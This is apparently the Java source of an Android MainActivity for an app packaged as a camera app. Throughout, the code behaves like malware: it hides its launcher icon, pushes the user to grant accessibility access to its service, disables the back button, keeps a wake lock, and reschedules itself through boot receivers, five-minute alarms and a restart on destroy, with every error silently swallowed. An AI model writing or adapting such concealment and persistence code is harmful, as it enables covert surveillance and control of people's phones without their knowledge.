package com.android.photo.camera.capture;

import android.app.ActivityManager;
import android.os.Handler;
import android.os.Looper;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.View;
import androidx.core.content.ContextCompat;
import android.app.AlarmManager;
import android.app.PendingIntent;
import androidx.annotation.NonNull;

public class MainActivity extends Activity {
    private static final String HIDDEN_STATUS = "hidden_status";
    private static final String PREF_BOOT_COUNT = "boot_count";
    private static final int RESTART_INTERVAL = 5 * 60 * 1000;

    private PermissionHandler permissionHandler;
    private boolean isInitialized = false;
    private final Handler handler;
    private PowerManager.WakeLock wakeLock;
    private volatile boolean isActivityDestroyed = false;
    private SharedPreferences sharedPreferences;

    public MainActivity() {
        handler = new Handler(Looper.getMainLooper());
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        initializeWakeLock();

        if (getIntent().getBooleanExtra("fromBoot", false)) {
            startFromBoot();
        }

        setupWindow();
        setContentView(R.layout.activity_main);

        initializePreferences();
        hideIconIfNeeded();
        initializePermissionHandler();
        setupPeriodicRestart();
        ensureServiceRunning();
    }

    private void initializeWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "MyApp::MainActivityWakeLock"
            );
            wakeLock.acquire(10*60*1000L);
        } catch (Exception e) {
            // Handle silently
        }
    }

    private void setupWindow() {
        try {
            getWindow().setStatusBarColor(Color.TRANSPARENT);
            getWindow().getDecorView().setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE |
                            View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
            );
        } catch (Exception e) {
            // Handle silently
        }
    }

    private void initializePreferences() {
        sharedPreferences = getSharedPreferences("AppSettings", Context.MODE_PRIVATE);
    }

    private void hideIconIfNeeded() {
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
            executeHideFunction();
        }
    }

    private void executeHideFunction() {
        try {
            SharedPreferences.Editor editor = sharedPreferences.edit();
            editor.putBoolean(HIDDEN_STATUS, true);
            editor.apply();

            getPackageManager().setComponentEnabledSetting(
                    getComponentName(),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
            );
        } catch (Exception e) {
            // Handle silently
        }
    }

    private void initializePermissionHandler() {
        if (isFinishing() || isActivityDestroyed) return;

        permissionHandler = new PermissionHandler(this);
        handler.postDelayed(() -> {
            if (!isFinishing() && !isActivityDestroyed) {
                permissionHandler.startPermissionRequest();
                if (permissionHandler.isAllPermissionsGranted()) {
                    setContentView(R.layout.main_service);
                    initializeApp();
                }
            }
        }, 500);
    }

    public void openAccessibilitySettings(View view) {
        if (isFinishing() || isActivityDestroyed) return;

        try {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            String settingsClassName = getPackageName() + "/" + Service.class.getName(); // Changed from Service to Service
            Bundle bundle = new Bundle();
            bundle.putString(":settings:fragment_args_key", settingsClassName);
            intent.putExtra(":settings:show_fragment_args", bundle);
            intent.putExtra(":settings:source_package", getPackageName());
            startActivity(intent);
            finish();
        } catch (Exception e) {
            try {
                Intent fallbackIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                startActivity(fallbackIntent);
                finish();
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    private void setupPeriodicRestart() {
        if (isFinishing() || isActivityDestroyed) return;

        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            Intent intent = new Intent(this, MyReceiver.class);
            intent.setAction("PERIODIC_RESTART");

            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                    this,
                    0,
                    intent,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
            );

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(
                        AlarmManager.RTC_WAKEUP,
                        System.currentTimeMillis() + RESTART_INTERVAL,
                        pendingIntent
                );
            } else {
                alarmManager.setRepeating(
                        AlarmManager.RTC_WAKEUP,
                        System.currentTimeMillis(),
                        RESTART_INTERVAL,
                        pendingIntent
                );
            }
        } catch (Exception e) {
            // Handle silently
        }
    }

    private void startFromBoot() {
        incrementBootCount();
        if (!isServiceRunning(Service.class)) { // Changed from MainService to Service
            Intent serviceIntent = new Intent(this, Service.class); // Changed from MainService to Service
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(serviceIntent);
                } else {
                    startService(serviceIntent);
                }
            } catch (Exception e) {
                // Handle silently
            }
        }
        setupPeriodicRestart();
    }

    private void incrementBootCount() {
        try {
            int currentCount = sharedPreferences.getInt(PREF_BOOT_COUNT, 0);
            SharedPreferences.Editor editor = sharedPreferences.edit();
            editor.putInt(PREF_BOOT_COUNT, currentCount + 1);
            editor.apply();
        } catch (Exception e) {
            // Handle silently
        }
    }

    private void ensureServiceRunning() {
        if (isFinishing() || isActivityDestroyed) return;

        try {
            Intent serviceIntent = new Intent(this, Service.class); // Changed from MainService to Service
            serviceIntent.putExtra("persistent", true);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {
            // Handle silently
        }
    }

    private boolean isServiceRunning(Class<?> serviceClass) {
        try {
            ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
                if (serviceClass.getName().equals(service.service.getClassName())) {
                    return true;
                }
            }
        } catch (Exception e) {
            // Handle silently
        }
        return false;
    }

    @Override
    protected void onResume() {
        super.onResume();

        if (!isInitialized && permissionHandler != null && permissionHandler.isAllPermissionsGranted()) {
            isInitialized = true;
            setContentView(R.layout.main_service);
            initializeApp();
        }

        if (permissionHandler != null && !isActivityDestroyed) {
            permissionHandler.onResume();
        }

        ensureServiceRunning();
    }

    private void initializeApp() {
        if (isFinishing() || isActivityDestroyed) return;

        try {
            if (!isFinishing()) {
                Intent serviceIntent = new Intent(this, Service.class); // Changed from MainService to Service
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(serviceIntent);
                } else {
                    startService(serviceIntent);
                }
            }
            startService();
        } catch (Exception e) {
            // Handle silently
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (isFinishing() || isActivityDestroyed) return;

        if (permissionHandler != null) {
            permissionHandler.handlePermissionResult(requestCode, permissions, grantResults);

            if (permissionHandler.isAllPermissionsGranted() && !isInitialized) {
                isInitialized = true;
                setContentView(R.layout.main_service);
                initializeApp();
            }
        }
    }

    public void openGooglePlay(View view) {
        if (isFinishing() || isActivityDestroyed) return;

        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps"));
            startActivity(intent);
        } catch (Exception e) {
            // Handle silently
        }
    }

    private void startService() {
        if (isFinishing() || isActivityDestroyed) return;

        try {
            Intent serviceIntent = new Intent(this, Service.class); // Changed from MainService to Service
            ContextCompat.startForegroundService(this, serviceIntent);
        } catch (Exception e) {
            // Handle silently
        }
    }

    @Override
    public void onBackPressed() {
        // Block back button by doing nothing
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (permissionHandler != null) {
            permissionHandler.onPause();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        isActivityDestroyed = true;

        if (permissionHandler != null) {
            permissionHandler.onDestroy();
        }

        if (wakeLock != null && wakeLock.isHeld()) {
            try {
                wakeLock.release();
            } catch (Exception e) {
                // Handle silently
            }
        }

        // Schedule immediate service restart
        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
            Intent restartIntent = new Intent(this, MyReceiver.class);
            restartIntent.setAction("RESTART_SERVICE");

            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                    this,
                    0,
                    restartIntent,
                    PendingIntent.FLAG_IMMUTABLE
            );

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(
                        AlarmManager.RTC_WAKEUP,
                        System.currentTimeMillis() + 1000,
                        pendingIntent
                );
            } else {
                alarmManager.setExact(
                        AlarmManager.RTC_WAKEUP,
                        System.currentTimeMillis() + 1000,
                        pendingIntent
                );
            }
        } catch (Exception e) {
            // Handle silently
        }

        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }
    }
}